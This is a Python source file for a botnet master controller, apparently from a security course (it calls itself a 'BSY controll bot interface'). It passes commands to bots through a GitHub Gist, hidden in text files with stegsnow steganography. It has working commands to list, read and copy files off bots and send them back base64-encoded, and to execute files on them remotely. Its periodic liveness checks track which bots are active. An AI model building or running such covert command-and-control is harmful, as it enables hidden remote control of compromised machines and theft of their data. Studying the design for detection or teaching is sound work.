import os
import time
import threading
import base64

######## EDITABLE USER VARIABLES ###################################
GIST_ID = "799938c0850a634dfe9ce73436a00de0"

# TIMES
TIMEOUT_RESPONSE = 10 # timeout for waiting for response
TIMEOUT_ALIVE = 10 # timeout for checking if bot is alive
PERIOD_ALIVE = 60 # period between alive checks

INSTALL_TOOLS = True # Do gh and stegsnow need to be installed
LOGIN = False # login needed

############################################################3

# used file names
coverage_fn  = 'short0.txt'
command_fn = 'example0.txt'
temp_fn = 'resp.txt'

#known commands
commands = ['init', 'alive', 'w', 'ls', 'id', 'cat', 'echo', 'q', 'qq', 'cp', 'ex']
responses = ['init', 'ack']

sending = False # variable to prevent accessing from alive-checking thread and main at the same time
checking = True # thread runtime controlling variable

# active bots
active_bots = set()

def install_tools():
    """
    function installing neccessary tools
    """
    print("=> Installing necessary tools..")
    ret = os.popen(f'gh').read().split()
    if not ret or ret[0] == "bash:": # gh not installed yet
        os.system(f'curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg | sudo dd of=/usr/share/keyrings/githubcli-archive-keyring.gpg')
        os.system('echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/githubcli-archive-keyring.gpg] https://cli.github.com/packages stable main" | sudo tee /etc/apt/sources.list.d/github-cli.list > /dev/null')
        os.system('sudo apt update')
        os.system('sudo apt install gh')
    print("\tGH installed.")
    ret = os.popen(f'stegsnow -h').read().split()
    if not ret or ret[0] == "bash:": # stegsnow not installed yet
        os.system(f'sudo apt-get install stegsnow')
    print("\tStegsnow installed.")

def check_alive(period):
    global sending, checking, active_bots
    """
    function to check if the bots from channel are alive
    """
    while checking: # global variable determining, if the thread is still to run
        while sending:
            pass
        sending = True
        files_b = os.popen(f"gh gist view {GIST_ID} --files").read().split('\n')[:-1]
        num_slaves = len(files_b) - 2 # -2, because of master file and search.py file
        for i in range(1, num_slaves+1):
            response_fn = f'example{i}.txt'
            os.system(f"gh gist view {GIST_ID} -f {response_fn} > {temp_fn}") # get initial response
            prev_response = os.popen(f"stegsnow -C {temp_fn}").read()

            os.system(f'stegsnow -C -m "{i} alive" {coverage_fn} {command_fn} 2> steg.out') # conceal check alive command into coverage file
            os.system(f"gh gist edit {GIST_ID} -a {command_fn}") # send the command to channel

            start_t = time.time()
            while True: # check for response change
                os.system(f"gh gist view {GIST_ID} -f {response_fn} > {temp_fn}")
                response = os.popen(f"stegsnow -C {temp_fn}").read()
                if response != 'init' and prev_response != response: # new response
                    if response == 'ack': # ack returned
                        active_bots.add(i)
                        break
                if  (time.time() - start_t) > TIMEOUT_ALIVE: #timeout
                    if i in active_bots:
                        active_bots.remove(i)
                    break
                prev_response = response[:]

            os.system(f'stegsnow -C -m "a init" {coverage_fn} {command_fn} 2> steg.out') # send again the init response to show that command exectuion is no longer wanted and to acknowledge receiving
            os.system(f"gh gist edit {GIST_ID} -a {command_fn}")
            time.sleep(0.8)

        sending = False
        time.sleep(period)

if __name__ == '__main__':
    print(f" ___________________ \n\nWelcome to the BSY controll bot interface communicating at gist {GIST_ID}. \nThe commands are supported in the following format:"\
    "\n  <i> <command> <arguments>\n\t <i> is index of bot to be comanded or 'a' meaning all bots and 0 is reserved for master\n\t "\
    "<command> possibilities are\n\t"\
    "\t 'w', 'ls', 'id', 'cat' and 'echo', which are identical to bash commands and \n\t"\
    "\t 'q' for qutting the <i> bot,\n\t"\
    "\t 'qq' for killing only the master bot regardless of <i> and works also withou <i>,\n\t"\
    "\t 'cp' to copy file stated in the <arguments> part to the master bot,\n\t"\
    "\t 'ex', to execute file stated in the <arguments> part.\n"\
    "Parameters as timeout times, filenames or github gist id can be changed in the source code.\n ___________________ \n")

    if INSTALL_TOOLS:
        install_tools()

    if LOGIN:
        print("=> Logging into gist.github.")
        os.system(f'gh auth login --with-token < key.txt')

    # start communication with init command for all bots
    os.system(f'stegsnow -C -m "a init" {coverage_fn} {command_fn} 2> steg.out') #conceal init command into coverage file
    os.system(f"gh gist edit {GIST_ID} -a {command_fn}") # send command to channel

    # start periodical alive check in thread
    time.sleep(0.5)
    t1 = threading.Thread(target=check_alive, args=(PERIOD_ALIVE,))
    t1.start()


    while True: #command reading loop
        if sending:
            print("=> Waiting for finishing the check if the bots are alive.\n")
            while sending:
                pass
        print(f"Acitve bots are: {str(active_bots)}",flush=True)

        command = input("Insert command (or pres enter to refresh active_bots):\n") #wait for command
        cm_parts = command.split()
        #print('\n')

        if len(cm_parts) > 1 and cm_parts[1] in commands: #check if it is known command
            if cm_parts[0] == '0':
                print("Cannot send commands to master!")
                continue

            if cm_parts[1] in commands[-2:] and len(cm_parts) < 3:
                print("This command needs another argument")
                continue

            if cm_parts[1] == 'qq':
                print("Command qq received, terminating the master bot.")
                checking = False
                os.system(f"rm {command_fn} && rm {temp_fn}")
                break
            if cm_parts[1] == 'q':
                if int(cm_parts[0]) in active_bots:
                    active_bots.remove(int(cm_parts[0]))
                elif cm_parts[0] == 'a':
                    active_bots.clear()

            if sending:
                print("=> Waiting for finishing the check if the bots are alive.\n")
                while sending:
                    pass
                time.sleep(0.5)

            sending = True # reserve communication with server

            # resolve receivers and save initial responses to spot change in response

            receivers = active_bots if cm_parts[0] == 'a' else cm_parts[0]
            for i in receivers:
                response_fn = f'example{i}.txt'
                os.system(f"gh gist view {GIST_ID} -f {response_fn} > {temp_fn}") # get initial response
                prev_response = os.popen(f"stegsnow -C {temp_fn}").read()

                #send command
                cmd = ' '.join(cm_parts[1:])
                os.system(f'stegsnow -C -m "{i} {cmd}" {coverage_fn} {command_fn} 2> steg.out') # conceal command into coverage file
                os.system(f"gh gist edit {GIST_ID} -a {command_fn}") # send the command to channel
                print(f"Command {cm_parts[1]} sent to {i}, waiting for response..")

                response_fn = f'example{i}.txt'
                start_t = time.time()
                timeouted = False

                while True: # check for response change
                    os.system(f"gh gist view {GIST_ID} -f {response_fn} > {temp_fn}")
                    response = os.popen(f"stegsnow -C {temp_fn}").read()
                    if response and response != 'init' and prev_response != response: # new response
                        if cm_parts[1] == 'cp': #cp response needs saving into a file
                            fname = 'r_' + cm_parts[2].split('/')[-1]
                            resp = bytes(response, 'utf-8')
                            f = open(fname, 'wb')
                            f.write(base64.b64decode((resp)))
                            f.close()
                            print("File saved")
                        else: # other responses are printed
                            print(f"Response from {i} received:")
                            print(response)
                        active_bots.add(int(i))
                        break
                    if  (time.time() - start_t) > TIMEOUT_RESPONSE: #timeout
                        print(f"Waiting for response from {i} timeouted!")
                        timeouted = True
                        break

                    prev_response = response[:]

                os.system(f'stegsnow -C -m "{i} init" {coverage_fn} {command_fn} 2> steg.out') # send again the init response to show that command exectuion is no longer wanted and to acknowledge receiving
                os.system(f"gh gist edit {GIST_ID} -a {command_fn}")

                if not timeouted:
                    print(f"Waiting for acknowledgement from {i}..")
                    start_t = time.time()
                    while True: # check for response change
                        os.system(f"gh gist view {GIST_ID} -f {response_fn} > {temp_fn}")
                        response = os.popen(f"stegsnow -C {temp_fn}").read()
                        if response == commands[0]:
                            print(f"Acknowledgement from {i} received.")
                            break
                        if  (time.time() - start_t) > TIMEOUT_RESPONSE: #timeout
                            print(f"Waiting for ack from {i} timeouted!")
                            break

            sending = False # free the server


        else:
            if cm_parts and cm_parts[0] == 'qq':
                print("Command qq received, terminating the master bot.")
                checking = False
                os.system(f"rm {command_fn} && rm {temp_fn}")
                break;
            if cm_parts:
                print("Unknown command, not sending.")
            elif not sending:
                print('\033[4A') #return cursor back to overwrite active bots
    #t1.join()
    print("Program ending.")
